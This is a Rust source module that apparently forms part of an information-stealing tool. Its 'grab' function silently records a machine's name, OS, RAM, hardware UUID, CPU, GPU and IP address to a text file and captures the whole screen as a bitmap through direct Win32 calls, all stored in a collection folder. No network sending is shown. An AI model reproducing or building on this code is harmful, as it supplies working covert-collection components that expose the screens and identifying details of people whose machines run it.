use std::ffi::c_void;
use std::path::Path;
use std::ptr;

use crate::sysinfo::SystemInfo;

pub fn grab(output_dir: &Path, sys_info: &SystemInfo) {
    let desktop_dir = output_dir.join("Desktop");
    if std::fs::create_dir_all(&desktop_dir).is_err() {
        return;
    }

    w_sysinfo(&desktop_dir, sys_info);
    c_screenshot(&desktop_dir);
}

fn w_sysinfo(dir: &Path, s: &SystemInfo) {
    let gpu_str = if s.gpus.is_empty() {
        "Unknown".to_string()
    } else {
        s.gpus.join(", ")
    };

    let content = format!(
        "Computer : {}\nOS       : {}\nRAM      : {}\nUUID     : {}\nCPU      : {}\nGPU      : {}\nIP       : {}\n",
        s.computer_name,
        s.os_version,
        s.total_memory_gb,
        s.uuid,
        s.cpu_name,
        gpu_str,
        s.ip_address,
    );

    let _ = std::fs::write(dir.join("sysinfo.txt"), content);
}

fn c_screenshot(dir: &Path) {
    unsafe {
        #[link(name = "user32")]
        extern "system" {
            fn GetDC(hWnd: *mut c_void) -> *mut c_void;
            fn ReleaseDC(hWnd: *mut c_void, hDC: *mut c_void) -> i32;
        }

        #[link(name = "gdi32")]
        extern "system" {
            fn CreateCompatibleDC(hdc: *mut c_void) -> *mut c_void;
            fn CreateCompatibleBitmap(hdc: *mut c_void, cx: i32, cy: i32) -> *mut c_void;
            fn SelectObject(hdc: *mut c_void, h: *mut c_void) -> *mut c_void;
            fn BitBlt(hdc: *mut c_void, x: i32, y: i32, cx: i32, cy: i32,
                      hdcSrc: *mut c_void, x1: i32, y1: i32, rop: u32) -> i32;
            fn GetDIBits(hdc: *mut c_void, hbm: *mut c_void, start: u32, cLines: u32,
                         lpvBits: *mut c_void, lpbmi: *mut BitmapInfo, usage: u32) -> i32;
            fn DeleteDC(hdc: *mut c_void) -> i32;
            fn DeleteObject(ho: *mut c_void) -> i32;
            fn GetDeviceCaps(hdc: *mut c_void, nIndex: i32) -> i32;
        }

        #[repr(C)]
        struct BitmapInfoHeader {
            bi_size: u32,
            bi_width: i32,
            bi_height: i32,
            bi_planes: u16,
            bi_bit_count: u16,
            bi_compression: u32,
            bi_size_image: u32,
            bi_x_pels_per_meter: i32,
            bi_y_pels_per_meter: i32,
            bi_clr_used: u32,
            bi_clr_important: u32,
        }

        #[repr(C)]
        struct BitmapInfo {
            bmi_header: BitmapInfoHeader,
            bmi_colors: [u32; 1],
        }
        let screen_dc = GetDC(ptr::null_mut());
        if screen_dc.is_null() {
            return;
        }

        let width = GetDeviceCaps(screen_dc, 118);
        let height = GetDeviceCaps(screen_dc, 117);
        if width <= 0 || height <= 0 {
            ReleaseDC(ptr::null_mut(), screen_dc);
            return;
        }

        let mem_dc = CreateCompatibleDC(screen_dc);
        if mem_dc.is_null() {
            ReleaseDC(ptr::null_mut(), screen_dc);
            return;
        }

        let bitmap = CreateCompatibleBitmap(screen_dc, width, height);
        if bitmap.is_null() {
            DeleteDC(mem_dc);
            ReleaseDC(ptr::null_mut(), screen_dc);
            return;
        }

        SelectObject(mem_dc, bitmap);
        // SRCCOPY = 0x00CC0020
        BitBlt(mem_dc, 0, 0, width, height, screen_dc, 0, 0, 0x00CC0020);

        let row_stride = ((width * 3 + 3) & !3) as usize;
        let image_size = row_stride * height as usize;
        let mut pixels = vec![0u8; image_size];

        let mut bmi: BitmapInfo = std::mem::zeroed();
        bmi.bmi_header.bi_size = std::mem::size_of::<BitmapInfoHeader>() as u32;
        bmi.bmi_header.bi_width = width;
        bmi.bmi_header.bi_height = height;
        bmi.bmi_header.bi_planes = 1;
        bmi.bmi_header.bi_bit_count = 24;
        bmi.bmi_header.bi_compression = 0;
        bmi.bmi_header.bi_size_image = image_size as u32;

        GetDIBits(screen_dc, bitmap, 0, height as u32,
                  pixels.as_mut_ptr() as *mut c_void, &mut bmi, 0);

        DeleteObject(bitmap);
        DeleteDC(mem_dc);
        ReleaseDC(ptr::null_mut(), screen_dc);

        let file_size = 54u32 + image_size as u32;
        let mut bmp = Vec::with_capacity(file_size as usize);

        bmp.extend_from_slice(b"BM");
        bmp.extend_from_slice(&file_size.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        bmp.extend_from_slice(&54u32.to_le_bytes());

        bmp.extend_from_slice(&40u32.to_le_bytes());
        bmp.extend_from_slice(&width.to_le_bytes());
        bmp.extend_from_slice(&height.to_le_bytes());
        bmp.extend_from_slice(&1u16.to_le_bytes());
        bmp.extend_from_slice(&24u16.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        bmp.extend_from_slice(&(image_size as u32).to_le_bytes());
        bmp.extend_from_slice(&2835i32.to_le_bytes());
        bmp.extend_from_slice(&2835i32.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());

        bmp.extend_from_slice(&pixels);

        let _ = std::fs::write(dir.join("screenshot.bmp"), bmp);
    }
}
